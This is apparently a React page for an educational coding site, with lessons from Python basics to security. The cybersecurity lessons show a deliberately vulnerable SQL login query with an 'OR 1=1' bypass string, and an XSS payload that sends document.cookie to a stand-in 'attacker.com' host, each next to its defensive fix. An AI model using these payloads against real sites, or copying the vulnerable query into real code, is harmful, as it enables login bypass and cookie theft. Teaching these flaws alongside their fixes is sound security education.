'use client'

import Link from 'next/link'
import { useState } from 'react'
import { motion } from 'framer-motion'
import {
  Code2,
  ArrowLeft,
  ArrowRight,
  CheckCircle2,
  Play,
  Copy,
  Check,
  BookOpen,
  Sparkles,
  ChevronRight,
  Terminal,
  Binary,
  Globe,
  Brain,
  Database,
  Network,
  GitBranch,
  ShieldCheck,
} from 'lucide-react'
import Header from '@/components/layout/Header'
import Footer from '@/components/layout/Footer'

// ─── Topics & Lessons ──────────────────────────────────────────────────────────
const topics = [
  { id: 'python',           name: 'Python',           icon: Terminal,    lessons: ['Introduction', 'Variables', 'Data Types', 'Strings', 'Lists', 'Functions', 'Classes', 'Modules'] },
  { id: 'javascript',       name: 'JavaScript',       icon: Code2,       lessons: ['Introduction', 'Variables', 'Data Types', 'Arrays', 'Objects', 'Functions', 'DOM', 'Async/Await'] },
  { id: 'data-structures',  name: 'Data Structures',  icon: Binary,      lessons: ['Arrays', 'Linked Lists', 'Stacks', 'Queues', 'Trees', 'Graphs', 'Hash Tables', 'Heaps'] },
  { id: 'algorithms',       name: 'Algorithms',       icon: Brain,       lessons: ['Sorting', 'Searching', 'Recursion', 'Dynamic Programming', 'Greedy', 'Graph Algorithms'] },
  { id: 'web-dev',          name: 'Web Development',  icon: Globe,       lessons: ['HTML Basics', 'CSS Basics', 'Flexbox', 'Grid', 'Responsive Design', 'JavaScript DOM'] },
  { id: 'databases',        name: 'SQL & Databases',  icon: Database,    lessons: ['SELECT Basics', 'Filtering', 'Joins', 'Aggregations', 'Indexes', 'Transactions'] },
  { id: 'system-design',    name: 'System Design',    icon: Network,     lessons: ['Scalability', 'Load Balancing', 'Caching', 'Databases at Scale', 'Microservices', 'Message Queues'] },
  { id: 'devops',           name: 'DevOps & CI/CD',   icon: GitBranch,   lessons: ['Docker Basics', 'Docker Compose', 'GitHub Actions', 'Kubernetes', 'Cloud Deployment'] },
  { id: 'ml',               name: 'Machine Learning', icon: Brain,       lessons: ['Intro to ML', 'Linear Regression', 'Logistic Regression', 'Neural Networks', 'Scikit-learn'] },
  { id: 'cybersecurity',    name: 'Cybersecurity',    icon: ShieldCheck, lessons: ['SQL Injection', 'XSS', 'CSRF', 'Broken Authentication', 'Path Traversal', 'Secure Coding'] },
]

// ─── Lesson Content ────────────────────────────────────────────────────────────
const tutorialContent: Record<string, Record<string, { title: string; content: string; code: string; tryIt: boolean }>> = {
  python: {
    Introduction: {
      title: 'Python Introduction',
      content: `Python is a popular, high-level programming language created by Guido van Rossum and released in 1991.

It is used for:
- Web development (server-side)
- Data Science & Machine Learning
- Automation and scripting
- Desktop applications

Python prioritizes readability and simplicity, making it the ideal first language for engineers.`,
      code: `print("Hello, World!")

# This is a comment
name = "BlueLearnerHub"
version = 2.0

print(f"Welcome to {name} v{version}")

# Python is dynamically typed
x = 42        # int
y = 3.14      # float
z = "hello"   # str
b = True      # bool`,
      tryIt: true,
    },
    Variables: {
      title: 'Python Variables',
      content: `Variables are containers for storing data values. Python has no command for declaring a variable — it is created the moment you first assign a value to it.

Python is dynamically typed: you don't need to declare the type of a variable.`,
      code: `# Creating variables
x = 5
y = "John"
z = 3.14

print(x)  # 5
print(y)  # John
print(z)  # 3.14

# Check type
print(type(x))  # <class 'int'>
print(type(y))  # <class 'str'>

# Multiple assignment
a, b, c = 1, 2, 3
print(a, b, c)  # 1 2 3`,
      tryIt: true,
    },
    Strings: {
      title: 'Python Strings',
      content: `Strings in Python are surrounded by single or double quotation marks. Use triple quotes for multi-line strings.

Key string operations: slicing, methods (upper, lower, strip, replace), and f-strings.`,
      code: `a = "Hello"
b = 'World'
multi = """This is
a multiline
string"""

# String methods
text = "  Hello, Python!  "
print(text.strip())           # Remove whitespace
print(text.upper())           # UPPERCASE
print(text.replace("Python", "World"))

# String slicing
msg = "BlueLearnerHub"
print(msg[0:4])   # Blue
print(msg[-3:])   # Hub
print(msg[::-1])  # buHredoCeulB

# f-strings (Python 3.6+)
name = "Engineer"
xp = 1200
print(f"Welcome, {name}! XP: {xp}")`,
      tryIt: true,
    },
    Lists: {
      title: 'Python Lists',
      content: `Lists store multiple items in a single variable. They are ordered, changeable, and allow duplicate values.

Lists are one of the 4 built-in data types in Python used to store collections of data.`,
      code: `# Create a list
fruits = ["apple", "banana", "cherry"]

# Access items
print(fruits[0])   # apple
print(fruits[-1])  # cherry (last)

# Modify
fruits[0] = "orange"
fruits.append("mango")
fruits.remove("banana")

# Slicing
print(fruits[1:3])  # ['cherry', 'mango']

# Loop
for fruit in fruits:
    print(fruit)

# List comprehension
squares = [x**2 for x in range(5)]
print(squares)  # [0, 1, 4, 9, 16]`,
      tryIt: true,
    },
    Functions: {
      title: 'Python Functions',
      content: `A function is a block of code that runs when it is called. You can pass data (parameters) into a function and it can return a result.

Functions help you avoid repetition and make your code reusable.`,
      code: `# Define a function
def greet(name):
    return f"Hello, {name}!"

# Call function
message = greet("BlueLearnerHub")
print(message)

# Default parameter
def power(base, exponent=2):
    return base ** exponent

print(power(3))     # 9
print(power(3, 3))  # 27

# *args and **kwargs
def summarize(*args, **kwargs):
    print("Args:", args)
    print("Kwargs:", kwargs)

summarize(1, 2, 3, name="Alice", score=95)`,
      tryIt: true,
    },
  },
  javascript: {
    Introduction: {
      title: 'JavaScript Introduction',
      content: `JavaScript is the world's most popular programming language and the language of the Web.

It runs in browsers, on servers (Node.js), and in mobile apps. JavaScript makes web pages interactive.`,
      code: `// Hello World
console.log("Hello, World!");

// Variables
let name = "BlueLearnerHub";
const PI = 3.14159;
var legacy = "old style";

console.log(\`Welcome to \${name}\`);

// Template literals
const score = 1200;
console.log(\`XP Score: \${score} points!\`);

// Arithmetic
console.log(2 ** 10);  // 1024
console.log(17 % 5);   // 2`,
      tryIt: true,
    },
    Arrays: {
      title: 'JavaScript Arrays',
      content: `Arrays store multiple values. They are zero-indexed and support dozens of built-in methods for filtering, mapping, and reducing data.`,
      code: `const fruits = ["apple", "banana", "cherry"];

// Access
console.log(fruits[0]);   // apple
console.log(fruits.length); // 3

// Mutate
fruits.push("orange");
fruits.unshift("grape"); // add to front

// Iteration
fruits.forEach((f, i) => console.log(i, f));

// Functional methods
const upper = fruits.map(f => f.toUpperCase());
const long  = fruits.filter(f => f.length > 5);
const found = fruits.find(f => f.startsWith("m"));

console.log(upper);
console.log(long);`,
      tryIt: true,
    },
    Functions: {
      title: 'JavaScript Functions',
      content: `Functions are the building blocks of JavaScript. Use function declarations, expressions, or arrow functions.`,
      code: `// Declaration
function greet(name) {
  return "Hello, " + name + "!";
}

// Expression
const add = function(a, b) { return a + b; };

// Arrow function
const multiply = (a, b) => a * b;

// Default params
function power(base, exp = 2) {
  return Math.pow(base, exp);
}

console.log(greet("World"));   // Hello, World!
console.log(add(5, 3));        // 8
console.log(multiply(4, 6));   // 24
console.log(power(3));         // 9
console.log(power(2, 10));     // 1024`,
      tryIt: true,
    },
  },
  'data-structures': {
    Arrays: {
      title: 'Arrays',
      content: `An array is a collection of elements stored at contiguous memory locations. It is the simplest and most widely used data structure.

**Time complexity:** Access O(1), Search O(n), Insert/Delete O(n).`,
      code: `# Array operations in Python
arr = [10, 20, 30, 40, 50]

# Access O(1)
print(arr[2])   # 30

# Search O(n)
target = 30
for i, val in enumerate(arr):
    if val == target:
        print(f"Found {target} at index {i}")

# Insert at position O(n)
arr.insert(2, 25)   # [10, 20, 25, 30, 40, 50]

# Delete O(n)
arr.pop(0)          # Remove first element

# 2D Array (Matrix)
matrix = [[1, 2, 3],
          [4, 5, 6],
          [7, 8, 9]]

print(matrix[1][2])  # 6`,
      tryIt: true,
    },
    'Linked Lists': {
      title: 'Linked Lists',
      content: `A linked list is a linear data structure where elements are stored as nodes, each containing data and a pointer to the next node.

Unlike arrays, linked list elements are NOT stored at contiguous memory locations.`,
      code: `class Node:
    def __init__(self, data):
        self.data = data
        self.next = None

class LinkedList:
    def __init__(self):
        self.head = None
    
    def append(self, data):
        new_node = Node(data)
        if not self.head:
            self.head = new_node
            return
        current = self.head
        while current.next:
            current = current.next
        current.next = new_node
    
    def display(self):
        nodes = []
        current = self.head
        while current:
            nodes.append(str(current.data))
            current = current.next
        print(" -> ".join(nodes))

ll = LinkedList()
ll.append(10)
ll.append(20)
ll.append(30)
ll.display()  # 10 -> 20 -> 30`,
      tryIt: true,
    },
    Stacks: {
      title: 'Stacks',
      content: `A stack is a LIFO (Last In First Out) data structure. The last element pushed is the first to be popped.

Use cases: undo/redo, browser history, function call stack, expression evaluation.`,
      code: `class Stack:
    def __init__(self):
        self.items = []
    
    def push(self, item):
        self.items.append(item)
    
    def pop(self):
        if not self.is_empty():
            return self.items.pop()
        return "Stack is empty"
    
    def peek(self):
        if not self.is_empty():
            return self.items[-1]
    
    def is_empty(self):
        return len(self.items) == 0
    
    def size(self):
        return len(self.items)

# Usage
stack = Stack()
stack.push(10)
stack.push(20)
stack.push(30)
print(stack.peek())  # 30 (top)
print(stack.pop())   # 30
print(stack.size())  # 2`,
      tryIt: true,
    },
  },
  algorithms: {
    Sorting: {
      title: 'Sorting Algorithms',
      content: `Sorting algorithms arrange data in a specific order. Understanding time and space complexity helps you choose the right algorithm.

| Algorithm | Best | Average | Worst | Space |
|-----------|------|---------|-------|-------|
| Bubble Sort | O(n) | O(n²) | O(n²) | O(1) |
| Quick Sort | O(n log n) | O(n log n) | O(n²) | O(log n) |
| Merge Sort | O(n log n) | O(n log n) | O(n log n) | O(n) |`,
      code: `# Bubble Sort
def bubble_sort(arr):
    n = len(arr)
    for i in range(n):
        for j in range(0, n-i-1):
            if arr[j] > arr[j+1]:
                arr[j], arr[j+1] = arr[j+1], arr[j]
    return arr

# Quick Sort
def quick_sort(arr):
    if len(arr) <= 1:
        return arr
    pivot = arr[len(arr) // 2]
    left   = [x for x in arr if x < pivot]
    middle = [x for x in arr if x == pivot]
    right  = [x for x in arr if x > pivot]
    return quick_sort(left) + middle + quick_sort(right)

# Merge Sort
def merge_sort(arr):
    if len(arr) <= 1:
        return arr
    mid = len(arr) // 2
    left  = merge_sort(arr[:mid])
    right = merge_sort(arr[mid:])
    return merge(left, right)

def merge(left, right):
    result = []
    i = j = 0
    while i < len(left) and j < len(right):
        if left[i] <= right[j]:
            result.append(left[i]); i += 1
        else:
            result.append(right[j]); j += 1
    return result + left[i:] + right[j:]

arr = [64, 34, 25, 12, 22, 11, 90]
print(quick_sort(arr))  # [11, 12, 22, 25, 34, 64, 90]`,
      tryIt: true,
    },
    Searching: {
      title: 'Searching Algorithms',
      content: `Searching algorithms find a target element in a collection.

- **Linear Search**: O(n) — works on any array
- **Binary Search**: O(log n) — requires sorted array`,
      code: `# Linear Search O(n)
def linear_search(arr, target):
    for i, val in enumerate(arr):
        if val == target:
            return i
    return -1

# Binary Search O(log n) — array must be sorted!
def binary_search(arr, target):
    left, right = 0, len(arr) - 1
    while left <= right:
        mid = (left + right) // 2
        if arr[mid] == target:
            return mid
        elif arr[mid] < target:
            left = mid + 1
        else:
            right = mid - 1
    return -1

# Test
arr = [1, 3, 5, 7, 9, 11, 13, 15]
print(binary_search(arr, 7))   # 3
print(binary_search(arr, 6))   # -1

# Recursive Binary Search
def binary_search_r(arr, target, lo=0, hi=None):
    if hi is None:
        hi = len(arr) - 1
    if lo > hi:
        return -1
    mid = (lo + hi) // 2
    if arr[mid] == target:
        return mid
    elif arr[mid] < target:
        return binary_search_r(arr, target, mid+1, hi)
    else:
        return binary_search_r(arr, target, lo, mid-1)`,
      tryIt: true,
    },
    Recursion: {
      title: 'Recursion',
      content: `Recursion is when a function calls itself to solve smaller instances of a problem. Every recursive solution needs:
1. A base case (termination condition)
2. A recursive case`,
      code: `# Factorial
def factorial(n):
    if n <= 1:             # base case
        return 1
    return n * factorial(n - 1)  # recursive case

# Fibonacci
def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n-1) + fibonacci(n-2)

# Fibonacci with memoization (much faster)
def fib_memo(n, memo={}):
    if n in memo:
        return memo[n]
    if n <= 1:
        return n
    memo[n] = fib_memo(n-1, memo) + fib_memo(n-2, memo)
    return memo[n]

print(factorial(5))        # 120
print(fibonacci(10))       # 55
print(fib_memo(50))        # 12586269025

# Tower of Hanoi
def hanoi(n, src, dst, aux):
    if n == 1:
        print(f"Move disk 1 from {src} to {dst}")
        return
    hanoi(n-1, src, aux, dst)
    print(f"Move disk {n} from {src} to {dst}")
    hanoi(n-1, aux, dst, src)

hanoi(3, 'A', 'C', 'B')`,
      tryIt: true,
    },
  },
  'web-dev': {
    'HTML Basics': {
      title: 'HTML Basics',
      content: `HTML (HyperText Markup Language) is the standard markup language for creating web pages. HTML describes the structure of a web page using elements represented by tags.`,
      code: `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My First Page</title>
</head>
<body>
    <header>
        <h1>Welcome to BlueLearnerHub</h1>
        <nav>
            <a href="#about">About</a>
            <a href="#learn">Learn</a>
        </nav>
    </header>
    
    <main id="learn">
        <section>
            <h2>Start Learning</h2>
            <p>Master engineering with free lessons.</p>
            <ul>
                <li>Computer Science</li>
                <li>Mechanical Engineering</li>
                <li>Electrical Engineering</li>
            </ul>
            <button>Get Started →</button>
        </section>
    </main>
    
    <footer>
        <p>&copy; 2026 BlueLearnerHub</p>
    </footer>
</body>
</html>`,
      tryIt: true,
    },
    'CSS Basics': {
      title: 'CSS Basics',
      content: `CSS (Cascading Style Sheets) controls the visual presentation of HTML. It handles colors, fonts, spacing, layout, and responsive design.`,
      code: `/* Selectors */
h1 { color: #2d47d8; }          /* Element */
.card { border-radius: 12px; }  /* Class */
#hero { background: #eef2fb; }  /* ID */

/* Box Model */
.box {
    width: 300px;
    padding: 20px;        /* inside spacing */
    border: 2px solid #ccc;
    margin: 16px auto;    /* outside spacing */
}

/* Colors */
.btn {
    background-color: #2d47d8;
    color: white;
    border: none;
    padding: 12px 24px;
    border-radius: 8px;
    cursor: pointer;
}

.btn:hover {
    background-color: #1e35c0;
    transform: translateY(-1px);
}

/* Variables */
:root {
    --primary: #2d47d8;
    --bg: #eef2fb;
    --font-mono: 'Space Mono', monospace;
}`,
      tryIt: true,
    },
    Flexbox: {
      title: 'CSS Flexbox',
      content: `Flexbox is a CSS layout module for one-dimensional layouts (row or column). It handles alignment, distribution, and ordering of items along a single axis.`,
      code: `/* Flex container */
.nav {
    display: flex;
    justify-content: space-between; /* main axis */
    align-items: center;            /* cross axis */
    padding: 0 24px;
    height: 56px;
}

/* Center content */
.hero {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    min-height: 60vh;
    gap: 16px;  /* spacing between children */
}

/* Responsive card grid */
.cards {
    display: flex;
    flex-wrap: wrap;
    gap: 20px;
}

.card {
    flex: 1 1 280px;  /* grow, shrink, min-basis */
    border: 1px solid #e0e0e0;
    border-radius: 12px;
    padding: 20px;
}`,
      tryIt: true,
    },
    Grid: {
      title: 'CSS Grid',
      content: `CSS Grid is a two-dimensional layout system for rows AND columns simultaneously. Perfect for page-level layouts and complex card grids.`,
      code: `/* Basic 3-column grid */
.lesson-grid {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 20px;
}

/* Responsive auto-fill */
.card-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
    gap: 16px;
}

/* Named template areas */
.page-layout {
    display: grid;
    grid-template-areas:
        "header  header"
        "sidebar main  "
        "footer  footer";
    grid-template-columns: 240px 1fr;
    grid-template-rows: 56px 1fr auto;
    min-height: 100vh;
}

.header  { grid-area: header; }
.sidebar { grid-area: sidebar; }
.main    { grid-area: main; }
.footer  { grid-area: footer; }`,
      tryIt: true,
    },
  },
  databases: {
    'SELECT Basics': {
      title: 'SELECT Basics',
      content: `SQL SELECT is used to query data from one or more tables. It is the most frequently used SQL statement.`,
      code: `-- Select all columns
SELECT * FROM students;

-- Select specific columns
SELECT name, email, score
FROM students;

-- Filter with WHERE
SELECT name, score
FROM students
WHERE score >= 90;

-- Sort results
SELECT name, score
FROM students
ORDER BY score DESC;

-- Limit results
SELECT name, score
FROM students
ORDER BY score DESC
LIMIT 10;

-- Distinct values
SELECT DISTINCT department
FROM students;`,
      tryIt: true,
    },
    Joins: {
      title: 'SQL Joins',
      content: `Joins combine rows from two or more tables based on a related column. The main types are INNER, LEFT, RIGHT, and FULL OUTER JOIN.`,
      code: `-- INNER JOIN: rows where both tables match
SELECT s.name, c.course_name, e.grade
FROM students s
INNER JOIN enrollments e ON s.id = e.student_id
INNER JOIN courses c ON e.course_id = c.id;

-- LEFT JOIN: all students, even without enrollments
SELECT s.name, c.course_name
FROM students s
LEFT JOIN enrollments e ON s.id = e.student_id
LEFT JOIN courses c ON e.course_id = c.id;

-- Self Join: find students in same department
SELECT a.name AS student1, b.name AS student2
FROM students a
JOIN students b ON a.department = b.department
  AND a.id < b.id;`,
      tryIt: true,
    },
  },
  'system-design': {
    Scalability: {
      title: 'Scalability',
      content: `Scalability is the system's ability to handle growing amounts of work. Two main approaches:

- **Vertical Scaling** (Scale Up): Add more CPU/RAM to existing server. Has limits.
- **Horizontal Scaling** (Scale Out): Add more servers. Requires load balancing.`,
      code: `// Design checklist for scalable systems
const scalabilityChecklist = {
  "Identify bottlenecks": [
    "Database queries (add indexes)",
    "Heavy computations (offload to background jobs)",
    "File I/O (use CDN + object storage)",
    "Memory limits (add caching layer)"
  ],
  
  "Apply patterns": {
    "Load Balancer": "Distributes traffic across servers",
    "Caching": "Redis/Memcached for hot data",
    "CDN": "Static assets served globally",
    "Database Sharding": "Split data across DB instances",
    "Read Replicas": "Scale reads independently",
    "Message Queue": "Decouple services (RabbitMQ, Kafka)"
  },
  
  "Estimation": {
    "1M users": "1-2 app servers, single DB",
    "10M users": "Auto-scaling group, read replicas",
    "100M users": "Multi-region, sharding, CDN"
  }
};`,
      tryIt: true,
    },
  },
  devops: {
    'Docker Basics': {
      title: 'Docker Basics',
      content: `Docker packages applications and their dependencies into containers — isolated, portable environments that run consistently everywhere.

Key concepts: Image, Container, Dockerfile, Docker Hub, Volumes, Networks.`,
      code: `# Dockerfile for a Node.js app
FROM node:18-alpine

WORKDIR /app

# Copy package files first (layer caching)
COPY package*.json ./
RUN npm ci --only=production

# Copy source code
COPY . .

EXPOSE 3000

CMD ["node", "server.js"]

# --- Common Docker commands ---
# docker build -t myapp:v1 .         # Build image
# docker run -p 3000:3000 myapp:v1   # Run container
# docker ps                          # List running containers
# docker logs <container-id>         # View logs
# docker exec -it <id> sh            # Shell into container
# docker stop <id>                   # Stop container
# docker push myapp:v1               # Push to registry`,
      tryIt: true,
    },
  },
  ml: {
    'Intro to ML': {
      title: 'Introduction to Machine Learning',
      content: `Machine Learning enables systems to learn from data without being explicitly programmed.

**Types of ML:**
- Supervised Learning: labeled training data (classification, regression)
- Unsupervised Learning: find patterns in unlabeled data (clustering)
- Reinforcement Learning: agent learns from rewards/penalties`,
      code: `import numpy as np
from sklearn.datasets import load_iris
from sklearn.model_selection import train_test_split
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import accuracy_score, classification_report

# Load a classic dataset
iris = load_iris()
X, y = iris.data, iris.target
print(f"Dataset: {X.shape[0]} samples, {X.shape[1]} features")

# Split into train and test sets
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.2, random_state=42
)

# Train a model
model = RandomForestClassifier(n_estimators=100, random_state=42)
model.fit(X_train, y_train)

# Evaluate
predictions = model.predict(X_test)
accuracy = accuracy_score(y_test, predictions)
print(f"Accuracy: {accuracy:.2%}")
print(classification_report(y_test, predictions, target_names=iris.target_names))`,
      tryIt: true,
    },
  },
  cybersecurity: {
    'SQL Injection': {
      title: 'SQL Injection',
      content: `SQL Injection is an attack where malicious SQL code is inserted into input fields to manipulate or access a database.

**Impact:** Attacker can read all data, bypass login, delete records, or execute commands.

**Prevention:** Always use parameterized queries / prepared statements.`,
      code: `# ❌ VULNERABLE CODE — never do this!
def get_user_bad(username, password):
    query = f"""
        SELECT * FROM users
        WHERE username = '{username}'
        AND password = '{password}'
    """
    # If username = "admin' OR '1'='1"
    # The query becomes: WHERE username = 'admin' OR '1'='1'
    # → bypasses password check!

# ✅ SAFE CODE — parameterized query
def get_user_safe(db, username, password):
    query = """
        SELECT * FROM users
        WHERE username = %s
        AND password_hash = %s
    """
    # Parameters are escaped separately — injection impossible
    return db.execute(query, (username, hash_password(password)))

# Also use:
# - ORM (SQLAlchemy, Prisma, Sequelize)
# - Input validation
# - Least privilege DB accounts
# - WAF (Web Application Firewall)`,
      tryIt: true,
    },
    XSS: {
      title: 'Cross-Site Scripting (XSS)',
      content: `XSS allows attackers to inject malicious scripts into web pages viewed by other users. The browser executes the script, which steals cookies, tokens, or performs actions on behalf of the victim.

**Prevention:** Escape output, use Content Security Policy, sanitize HTML.`,
      code: `// ❌ VULNERABLE — injects raw HTML
function renderUserBio(bio) {
  document.getElementById("bio").innerHTML = bio;
  // If bio = "<script>document.location='attacker.com?c='+document.cookie</script>"
  // → cookie theft!
}

// ✅ SAFE — use textContent or escape HTML
function renderUserBioSafe(bio) {
  document.getElementById("bio").textContent = bio;
  // textContent treats input as text, not HTML
}

// ✅ ALSO SAFE — escape before inserting
function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

// Content Security Policy (HTTP header)
// Content-Security-Policy: default-src 'self'; script-src 'self'`,
      tryIt: true,
    },
  },
}

export default function ComputerSciencePage() {
  const [selectedTopic, setSelectedTopic] = useState('python')
  const [selectedLesson, setSelectedLesson] = useState('Introduction')
  const [copied, setCopied] = useState(false)
  const [sidebarOpen, setSidebarOpen] = useState(true)

  const currentTopicData = topics.find(t => t.id === selectedTopic)
  const currentContent   = tutorialContent[selectedTopic] ?? {}
  const lessonData       = currentContent[selectedLesson]

  const currentLessons   = currentTopicData?.lessons ?? []
  const currentIndex     = currentLessons.indexOf(selectedLesson)

  const copyCode = () => {
    if (lessonData?.code) {
      navigator.clipboard.writeText(lessonData.code)
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    }
  }

  return (
    <div className="min-h-screen bg-background">
      <Header />

      <div className="flex pt-14">
        {/* ══════════════════════════════════════
            LEFT SIDEBAR
        ══════════════════════════════════════ */}
        <aside
          className="fixed left-0 top-14 h-[calc(100vh-3.5rem)] w-64 border-r border-border bg-card overflow-y-auto scrollbar-thin z-20"
          style={{ boxShadow: '1px 0 0 0 hsl(var(--border))' }}
        >
          <div className="p-4">
            {/* Back to library */}
            <Link
              href="/library"
              className="mb-5 flex items-center gap-2 text-sm font-mono font-medium text-muted-foreground hover:text-primary transition-colors"
            >
              <ArrowLeft className="h-4 w-4" />
              Back to Library
            </Link>

            {/* Domain label */}
            <div className="mb-4 flex items-center gap-2.5">
              <div
                className="flex h-8 w-8 items-center justify-center rounded-lg"
                style={{ background: 'hsl(var(--primary) / 0.10)' }}
              >
                <Code2 className="h-4 w-4 text-primary" />
              </div>
              <div>
                <p className="text-xs font-mono text-muted-foreground uppercase tracking-wider">Domain</p>
                <p className="text-sm font-bold text-foreground">Computer Science</p>
              </div>
            </div>

            {/* Divider */}
            <div className="mb-4 border-t border-border" />

            {/* Topic list */}
            <p className="mb-2 text-[10px] font-mono font-bold uppercase tracking-widest text-muted-foreground px-1">
              Topics
            </p>
            <nav className="space-y-0.5">
              {topics.map((topic) => {
                const Icon = topic.icon
                const isActive = selectedTopic === topic.id
                return (
                  <button
                    key={topic.id}
                    onClick={() => {
                      setSelectedTopic(topic.id)
                      setSelectedLesson(topic.lessons[0])
                    }}
                    className={`w-full flex items-center gap-2.5 px-3 py-2 text-sm rounded-lg transition-all text-left ${
                      isActive
                        ? 'bg-primary/10 text-primary font-semibold'
                        : 'text-muted-foreground hover:bg-secondary hover:text-foreground'
                    }`}
                  >
                    <Icon className="h-4 w-4 flex-shrink-0" />
                    <span className="truncate">{topic.name}</span>
                    {isActive && <ChevronRight className="h-3.5 w-3.5 ml-auto text-primary" />}
                  </button>
                )
              })}
            </nav>

            {/* Lessons sub-list */}
            {currentTopicData && (
              <div className="mt-5">
                <p className="mb-2 text-[10px] font-mono font-bold uppercase tracking-widest text-muted-foreground px-1">
                  {currentTopicData.name} Lessons
                </p>
                <div className="space-y-0.5">
                  {currentTopicData.lessons.map((lesson) => (
                    <button
                      key={lesson}
                      onClick={() => setSelectedLesson(lesson)}
                      className={`w-full text-left px-3 py-2 text-sm rounded-lg transition-colors font-mono ${
                        selectedLesson === lesson
                          ? 'bg-primary/10 text-primary font-medium'
                          : 'text-muted-foreground hover:text-foreground hover:bg-secondary/60'
                      }`}
                    >
                      {lesson}
                    </button>
                  ))}
                </div>
              </div>
            )}
          </div>
        </aside>

        {/* ══════════════════════════════════════
            MAIN CONTENT
        ══════════════════════════════════════ */}
        <main className="ml-64 flex-1 min-h-[calc(100vh-3.5rem)]">
          <div className="mx-auto max-w-4xl px-6 py-8">

            {/* ── Page breadcrumb header ── */}
            <div className="mb-8 flex flex-wrap items-center justify-between gap-4">
              <div>
                <div className="flex items-center gap-2 text-sm font-mono text-muted-foreground mb-1">
                  <Link href="/library" className="hover:text-primary transition-colors">Library</Link>
                  <span>/</span>
                  <span>Computer Science</span>
                  <span>/</span>
                  <span className="text-foreground">{currentTopicData?.name}</span>
                </div>
                <h1 className="text-2xl font-bold">
                  {lessonData?.title ?? `${currentTopicData?.name}: ${selectedLesson}`}
                </h1>
              </div>
              <div className="flex items-center gap-2">
                <span className="badge badge-primary flex items-center gap-1">
                  <Sparkles className="h-3 w-3" />
                  Free
                </span>
                <span className="badge border border-border text-muted-foreground font-mono">
                  <BookOpen className="h-3 w-3 mr-1" />
                  No Login
                </span>
              </div>
            </div>

            {/* ── Lesson content ── */}
            {lessonData ? (
              <motion.div
                key={`${selectedTopic}-${selectedLesson}`}
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.3 }}
                className="space-y-6"
              >
                {/* Theory card */}
                <div className="card p-7">
                  <div
                    className="text-sm text-muted-foreground leading-relaxed whitespace-pre-line"
                    style={{ fontFamily: 'var(--font-mono)' }}
                  >
                    {lessonData.content}
                  </div>
                </div>

                {/* Code example */}
                <div className="rounded-xl overflow-hidden border border-border" style={{ background: 'hsl(222 47% 9%)' }}>
                  {/* Code header */}
                  <div
                    className="flex items-center justify-between px-4 py-3 border-b"
                    style={{ background: 'hsl(222 47% 12%)', borderColor: 'hsl(222 47% 20%)' }}
                  >
                    <div className="flex items-center gap-2">
                      <span className="inline-block h-3 w-3 rounded-full bg-[#ff5f57]" />
                      <span className="inline-block h-3 w-3 rounded-full bg-[#ffbd2e]" />
                      <span className="inline-block h-3 w-3 rounded-full bg-[#28c840]" />
                      <span className="ml-2 text-xs font-mono text-gray-400">Example</span>
                    </div>
                    <button
                      onClick={copyCode}
                      className="flex items-center gap-1.5 text-xs font-mono text-gray-400 hover:text-white transition-colors"
                    >
                      {copied ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
                      {copied ? 'Copied!' : 'Copy'}
                    </button>
                  </div>
                  <pre
                    className="p-5 overflow-x-auto text-sm scrollbar-thin"
                    style={{ color: '#e6edf3', fontFamily: 'var(--font-mono)', lineHeight: 1.75 }}
                  >
                    <code>{lessonData.code}</code>
                  </pre>
                </div>

                {/* Try it + nav */}
                {lessonData.tryIt && (
                  <div className="flex flex-wrap items-center justify-between gap-4">
                    <Link
                      href="/ide"
                      className="btn btn-primary flex items-center gap-2"
                    >
                      <Play className="h-4 w-4" />
                      Try it Yourself
                    </Link>
                    <div className="flex items-center gap-1.5 text-sm font-mono text-muted-foreground">
                      <CheckCircle2 className="h-4 w-4 text-green-500" />
                      Free to use — no login required
                    </div>
                  </div>
                )}

                {/* Prev / Next navigation */}
                <div className="flex items-center justify-between pt-4 border-t border-border">
                  <button
                    onClick={() => {
                      if (currentIndex > 0) setSelectedLesson(currentLessons[currentIndex - 1])
                    }}
                    disabled={currentIndex === 0}
                    className="btn btn-outline flex items-center gap-2 disabled:opacity-40"
                  >
                    <ArrowLeft className="h-4 w-4" />
                    Previous
                  </button>
                  <span className="text-xs font-mono text-muted-foreground">
                    {currentIndex + 1} / {currentLessons.length}
                  </span>
                  <button
                    onClick={() => {
                      if (currentIndex < currentLessons.length - 1)
                        setSelectedLesson(currentLessons[currentIndex + 1])
                    }}
                    disabled={currentIndex === currentLessons.length - 1}
                    className="btn btn-primary flex items-center gap-2 disabled:opacity-40"
                  >
                    Next
                    <ArrowRight className="h-4 w-4" />
                  </button>
                </div>
              </motion.div>
            ) : (
              <div className="card p-10 text-center">
                <BookOpen className="mx-auto h-10 w-10 text-muted-foreground mb-3" />
                <p className="font-mono text-muted-foreground">
                  Select a topic and lesson from the sidebar to start learning.
                </p>
              </div>
            )}
          </div>

          {/* Footer inside main */}
          <div className="px-6 pb-8">
            <Footer />
          </div>
        </main>
      </div>
    </div>
  )
}
